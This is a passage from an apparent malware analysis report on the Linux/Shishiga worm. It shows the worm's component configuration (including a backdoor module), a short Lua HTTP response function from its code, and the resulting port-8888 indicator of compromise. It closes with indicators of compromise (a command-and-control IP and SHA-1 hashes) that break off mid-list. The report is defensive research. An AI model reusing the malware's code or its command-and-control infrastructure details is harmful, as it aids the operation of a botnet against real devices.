			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
{
    "src":[ 1
        "test.lua",
        "test1.lua",
        "test10.lua",
        "test2.lua",
        "test3.lua",
        "test5.lua",
        "test6.lua",
        "test_1.lua",
        "test_2.lua",
        "test_3.lua",
        "test_4.lua"
    ],

    "dm":[ 2
        "armv4l.dm",
        "i686.dm",
        "mips.dm",
        "mipsel.dm"
    ],

    "bt":[ 3
        "script.bt",
        "server.bt",
        "update.bt"
    ],

    "version":"1.0.0", 4

    "lua":[ 5
        "armv4l.lm",
        "i686.lm",
        "mips.lm",
        "mipsel.lm",
        "powerpc.lm"
    ],

    "os":"lin",
    "arch":"i686",
    "lua_version":"Lua 5.3"
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b86282e0441356034-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e0441356034-2">2</div><div class="crayon-num" data-line="crayon-60581b86282e0441356034-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e0441356034-4">4</div><div class="crayon-num" data-line="crayon-60581b86282e0441356034-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e0441356034-6">6</div><div class="crayon-num" data-line="crayon-60581b86282e0441356034-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e0441356034-8">8</div><div class="crayon-num" data-line="crayon-60581b86282e0441356034-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e0441356034-10">10</div><div class="crayon-num" data-line="crayon-60581b86282e0441356034-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e0441356034-12">12</div><div class="crayon-num" data-line="crayon-60581b86282e0441356034-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e0441356034-14">14</div><div class="crayon-num" data-line="crayon-60581b86282e0441356034-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e0441356034-16">16</div><div class="crayon-num" data-line="crayon-60581b86282e0441356034-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e0441356034-18">18</div><div class="crayon-num" data-line="crayon-60581b86282e0441356034-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e0441356034-20">20</div><div class="crayon-num" data-line="crayon-60581b86282e0441356034-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e0441356034-22">22</div><div class="crayon-num" data-line="crayon-60581b86282e0441356034-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e0441356034-24">24</div><div class="crayon-num" data-line="crayon-60581b86282e0441356034-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e0441356034-26">26</div><div class="crayon-num" data-line="crayon-60581b86282e0441356034-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e0441356034-28">28</div><div class="crayon-num" data-line="crayon-60581b86282e0441356034-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e0441356034-30">30</div><div class="crayon-num" data-line="crayon-60581b86282e0441356034-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e0441356034-32">32</div><div class="crayon-num" data-line="crayon-60581b86282e0441356034-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e0441356034-34">34</div><div class="crayon-num" data-line="crayon-60581b86282e0441356034-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e0441356034-36">36</div><div class="crayon-num" data-line="crayon-60581b86282e0441356034-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e0441356034-38">38</div><div class="crayon-num" data-line="crayon-60581b86282e0441356034-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e0441356034-40">40</div><div class="crayon-num" data-line="crayon-60581b86282e0441356034-41">41</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e0441356034-42">42</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b86282e0441356034-1"><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e0441356034-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"src"</span><span class="crayon-o">:</span><span class="crayon-sy">[</span><span class="crayon-h"> </span><span class="crayon-cn">1</span></div><div class="crayon-line" id="crayon-60581b86282e0441356034-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"test.lua"</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e0441356034-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"test1.lua"</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581b86282e0441356034-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"test10.lua"</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e0441356034-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"test2.lua"</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581b86282e0441356034-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"test3.lua"</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e0441356034-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"test5.lua"</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581b86282e0441356034-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"test6.lua"</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e0441356034-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"test_1.lua"</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581b86282e0441356034-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"test_2.lua"</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e0441356034-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"test_3.lua"</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581b86282e0441356034-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"test_4.lua"</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e0441356034-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581b86282e0441356034-15">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e0441356034-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"dm"</span><span class="crayon-o">:</span><span class="crayon-sy">[</span><span class="crayon-h"> </span><span class="crayon-cn">2</span></div><div class="crayon-line" id="crayon-60581b86282e0441356034-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"armv4l.dm"</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e0441356034-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"i686.dm"</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581b86282e0441356034-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"mips.dm"</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e0441356034-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"mipsel.dm"</span></div><div class="crayon-line" id="crayon-60581b86282e0441356034-21"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e0441356034-22">&nbsp;</div><div class="crayon-line" id="crayon-60581b86282e0441356034-23"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"bt"</span><span class="crayon-o">:</span><span class="crayon-sy">[</span><span class="crayon-h"> </span><span class="crayon-cn">3</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e0441356034-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"script.bt"</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581b86282e0441356034-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"server.bt"</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e0441356034-26"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"update.bt"</span></div><div class="crayon-line" id="crayon-60581b86282e0441356034-27"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e0441356034-28">&nbsp;</div><div class="crayon-line" id="crayon-60581b86282e0441356034-29"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"version"</span><span class="crayon-o">:</span><span class="crayon-s">"1.0.0"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">4</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e0441356034-30">&nbsp;</div><div class="crayon-line" id="crayon-60581b86282e0441356034-31"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"lua"</span><span class="crayon-o">:</span><span class="crayon-sy">[</span><span class="crayon-h"> </span><span class="crayon-cn">5</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e0441356034-32"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"armv4l.lm"</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581b86282e0441356034-33"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"i686.lm"</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e0441356034-34"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"mips.lm"</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581b86282e0441356034-35"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"mipsel.lm"</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e0441356034-36"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"powerpc.lm"</span></div><div class="crayon-line" id="crayon-60581b86282e0441356034-37"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e0441356034-38">&nbsp;</div><div class="crayon-line" id="crayon-60581b86282e0441356034-39"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"os"</span><span class="crayon-o">:</span><span class="crayon-s">"lin"</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e0441356034-40"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"arch"</span><span class="crayon-o">:</span><span class="crayon-s">"i686"</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581b86282e0441356034-41"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"lua_version"</span><span class="crayon-o">:</span><span class="crayon-s">"Lua 5.3"</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e0441356034-42"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p>
</div>
<div class="colist arabic">
<table>
<tbody>
<tr>
<td><b>(1)</b></td>
<td>Lua scripts</td>
</tr>
<tr>
<td><i class="conum" data-value="2"></i><b>(2)</b></td>
<td>backdoor (old name: <code>.dl</code>)</td>
</tr>
<tr>
<td><i class="conum" data-value="3"></i><b>(3)</b></td>
<td>BitTorrent scripts</td>
</tr>
<tr>
<td><i class="conum" data-value="4"></i><b>(4)</b></td>
<td>malware version</td>
</tr>
<tr>
<td><i class="conum" data-value="5"></i><b>(5)</b></td>
<td>modules loader</td>
</tr>
</tbody>
</table>
</div>
<div class="paragraph">
<p>Querying the root <code>/</code> on port <code>8888</code> will result in <code>HTTP/1.0 404 OK</code>, which serves as a simple indicator of compromise (IoC).</p>
</div>
<div class="listingblock">
<div class="title">http.lua response function</div>
<div>
<!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b86282e1788700039" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
function http.response(req,code,data,timeout)
    timeout=timeout or timeoutDef
    local hdr="HTTP/1.0 %d OK\r\nContent-Length: %d\r\nConnection: close\r\n\r\n"
    async.sendall(req.sock,hdr:format(code,data:len())..data,timeout)
    return true
end</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b86282e1788700039-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e1788700039-2">2</div><div class="crayon-num" data-line="crayon-60581b86282e1788700039-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e1788700039-4">4</div><div class="crayon-num" data-line="crayon-60581b86282e1788700039-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e1788700039-6">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b86282e1788700039-1"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-v">http</span><span class="crayon-sy">.</span><span class="crayon-e">response</span><span class="crayon-sy">(</span><span class="crayon-v">req</span><span class="crayon-sy">,</span><span class="crayon-v">code</span><span class="crayon-sy">,</span><span class="crayon-v">data</span><span class="crayon-sy">,</span><span class="crayon-v">timeout</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e1788700039-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">timeout</span><span class="crayon-o">=</span><span class="crayon-e">timeout </span><span class="crayon-st">or</span><span class="crayon-h"> </span><span class="crayon-e">timeoutDef</span></div><div class="crayon-line" id="crayon-60581b86282e1788700039-3"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">local </span><span class="crayon-v">hdr</span><span class="crayon-o">=</span><span class="crayon-s">"HTTP/1.0 %d OK\r\nContent-Length: %d\r\nConnection: close\r\n\r\n"</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e1788700039-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">async</span><span class="crayon-sy">.</span><span class="crayon-e">sendall</span><span class="crayon-sy">(</span><span class="crayon-v">req</span><span class="crayon-sy">.</span><span class="crayon-v">sock</span><span class="crayon-sy">,</span><span class="crayon-v">hdr</span><span class="crayon-o">:</span><span class="crayon-e">format</span><span class="crayon-sy">(</span><span class="crayon-v">code</span><span class="crayon-sy">,</span><span class="crayon-v">data</span><span class="crayon-o">:</span><span class="crayon-e">len</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-v">data</span><span class="crayon-sy">,</span><span class="crayon-v">timeout</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60581b86282e1788700039-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-t">true</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e1788700039-6"><span class="crayon-st">end</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->

</div>
</div>
<div class="paragraph">
<p>At this point in our investigation, we asked the <a href="https://censys.io" target="_blank" rel="noopener">Censys</a> team to do a mass scan of the Internet on TCP port 8888. They found about 10 IP addresses that match this particular HTTP answer. These IP addresses are potentially infected machines.</p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_conclusion">Conclusion</h2>
<div class="sectionbody">
<div class="paragraph">
<p>At a first glance, Linux/Shishiga might appear to be like the others, spreading through weak Telnet and SSH credentials, but the usage of the BitTorrent protocol and Lua modules separates it from the herd. BitTorrent used in a Mirai-inspired worm, <a href="https://security.rapiditynetworks.com/publications/2016-10-16/hajime.pdf" target="_blank" rel="noopener">Hajime</a>, was observed last year and we can only speculate that it might become more popular in the future.</p>
</div>
<div class="paragraph">
<p>It’s possible that Shishiga could still evolve and become more widespread but the low number of victims, constant adding, removing, and modifying of the components, code comments and even debug information, clearly indicate that it’s a work in progress. To prevent your devices from being infected by Shishiga and similar worms, you should not use default Telnet and SSH credentials.</p>
</div>
<div class="paragraph">
<p>We would like to thank the <a href="https://censys.io/" target="_blank" rel="noopener">Censys</a> team for their collaboration.</p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_iocs">IoCs</h2>
<div class="sectionbody">
<div class="paragraph">
<div class="title">C&amp;C</div>
<p>93.117.137.35</p>
</div>
<div class="listingblock">
<div class="title">SHA-1 hashes (.lm)</div>
<div class="content">
<!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b86282e2510020809" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
003f548796fb52ad281ae82c7e0bb7532dd34241
1a79092c6468d39a10f805c96ad7f8bf303b7dc8
1cc1b97f8f9bb7c4f435ef1316e08e5331b4331b
2889803777e2dfec7684512f45e87248a07d508f
2a809d37be5aa0655f5cc997eb62683e1b45da17
3f1ef05ca850e2f5030ee279b1c589c9e3cc576c
41bf0d5612ba5bc9a05e9d94df0f841b159264a0
4bc106f6231daa6641783dd9276b4f5c7fc41589
4d55efe18643d7408cbe12dd4f319a68084bd11e
4df58ab26f0fc8ec2d1513611ca2b852e7107096
51a4ca78ebb0649721ae472290bea7bfe983d727
5a88b67d8dfaf1f68308311b808f00e769e39e46
6458c48e5167a2371d9243d4b47ad191d642685b
688ccbca8b2918a161917031e21b6810c59eeab0
6e3ba86d1f91669e87945b8ea0211b58e315e189
6f41c8f797814e2e3f073601ce81e8adceef6a27
8a0d58472f6166ade0ae677bab7940fe38d66d35
8a1f9212f181e68a63e06a955e64d333b78c6bf6
8e3c4eb04d4cfd8f44c721111c5251d30ac848b6
979fb376d6adc65473c4f51ad1cc36e3612a1e73
a1f2535576116d93b62d7f5fc6e30e66e0e0a216
a694c6ecc2ff9702905f22b14ed448e9e76fe531
ac094b239851eaf2e9fd309285c0996fb33771a8
b14f7af9665ef77af530109a0331f8ca0bd2a167
b86935c4539901cdec9081d8a8ca915903adaff1
ba5df105496b0c4df7206d29fa544b7a7a346735
bf4d9e25fc210a1d9809aebb03b30748dd588d08
c22f0fb01c6d47957732a8b0f5ef0f7d4e614c79
ce4b3c92a96137e6215a5e2f5fd28a672eddaaab
d8a5d9c4605b33bd47fedbad5a0da9928de6aa33
f73022a4801e06d675e5c3011060242af7b949ad</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b86282e2510020809-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e2510020809-2">2</div><div class="crayon-num" data-line="crayon-60581b86282e2510020809-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e2510020809-4">4</div><div class="crayon-num" data-line="crayon-60581b86282e2510020809-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e2510020809-6">6</div><div class="crayon-num" data-line="crayon-60581b86282e2510020809-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e2510020809-8">8</div><div class="crayon-num" data-line="crayon-60581b86282e2510020809-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e2510020809-10">10</div><div class="crayon-num" data-line="crayon-60581b86282e2510020809-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e2510020809-12">12</div><div class="crayon-num" data-line="crayon-60581b86282e2510020809-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e2510020809-14">14</div><div class="crayon-num" data-line="crayon-60581b86282e2510020809-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e2510020809-16">16</div><div class="crayon-num" data-line="crayon-60581b86282e2510020809-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e2510020809-18">18</div><div class="crayon-num" data-line="crayon-60581b86282e2510020809-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e2510020809-20">20</div><div class="crayon-num" data-line="crayon-60581b86282e2510020809-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e2510020809-22">22</div><div class="crayon-num" data-line="crayon-60581b86282e2510020809-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e2510020809-24">24</div><div class="crayon-num" data-line="crayon-60581b86282e2510020809-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e2510020809-26">26</div><div class="crayon-num" data-line="crayon-60581b86282e2510020809-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e2510020809-28">28</div><div class="crayon-num" data-line="crayon-60581b86282e2510020809-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e2510020809-30">30</div><div class="crayon-num" data-line="crayon-60581b86282e2510020809-31">31</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b86282e2510020809-1"><span class="crayon-cn">003f548796fb52ad281ae82c7e0bb7532dd34241</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e2510020809-2"><span class="crayon-cn">1a79092c6468d39a10f805c96ad7f8bf303b7dc8</span></div><div class="crayon-line" id="crayon-60581b86282e2510020809-3"><span class="crayon-cn">1cc1b97f8f9bb7c4f435ef1316e08e5331b4331b</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e2510020809-4"><span class="crayon-cn">2889803777e2dfec7684512f45e87248a07d508f</span></div><div class="crayon-line" id="crayon-60581b86282e2510020809-5"><span class="crayon-cn">2a809d37be5aa0655f5cc997eb62683e1b45da17</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e2510020809-6"><span class="crayon-cn">3f1ef05ca850e2f5030ee279b1c589c9e3cc576c</span></div><div class="crayon-line" id="crayon-60581b86282e2510020809-7"><span class="crayon-cn">41bf0d5612ba5bc9a05e9d94df0f841b159264a0</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e2510020809-8"><span class="crayon-cn">4bc106f6231daa6641783dd9276b4f5c7fc41589</span></div><div class="crayon-line" id="crayon-60581b86282e2510020809-9"><span class="crayon-cn">4d55efe18643d7408cbe12dd4f319a68084bd11e</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e2510020809-10"><span class="crayon-cn">4df58ab26f0fc8ec2d1513611ca2b852e7107096</span></div><div class="crayon-line" id="crayon-60581b86282e2510020809-11"><span class="crayon-cn">51a4ca78ebb0649721ae472290bea7bfe983d727</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e2510020809-12"><span class="crayon-cn">5a88b67d8dfaf1f68308311b808f00e769e39e46</span></div><div class="crayon-line" id="crayon-60581b86282e2510020809-13"><span class="crayon-cn">6458c48e5167a2371d9243d4b47ad191d642685b</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e2510020809-14"><span class="crayon-cn">688ccbca8b2918a161917031e21b6810c59eeab0</span></div><div class="crayon-line" id="crayon-60581b86282e2510020809-15"><span class="crayon-cn">6e3ba86d1f91669e87945b8ea0211b58e315e189</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e2510020809-16"><span class="crayon-cn">6f41c8f797814e2e3f073601ce81e8adceef6a27</span></div><div class="crayon-line" id="crayon-60581b86282e2510020809-17"><span class="crayon-cn">8a0d58472f6166ade0ae677bab7940fe38d66d35</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e2510020809-18"><span class="crayon-cn">8a1f9212f181e68a63e06a955e64d333b78c6bf6</span></div><div class="crayon-line" id="crayon-60581b86282e2510020809-19"><span class="crayon-cn">8e3c4eb04d4cfd8f44c721111c5251d30ac848b6</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e2510020809-20"><span class="crayon-cn">979fb376d6adc65473c4f51ad1cc36e3612a1e73</span></div><div class="crayon-line" id="crayon-60581b86282e2510020809-21"><span class="crayon-e">a1f2535576116d93b62d7f5fc6e30e66e0e0a216</span></div><div 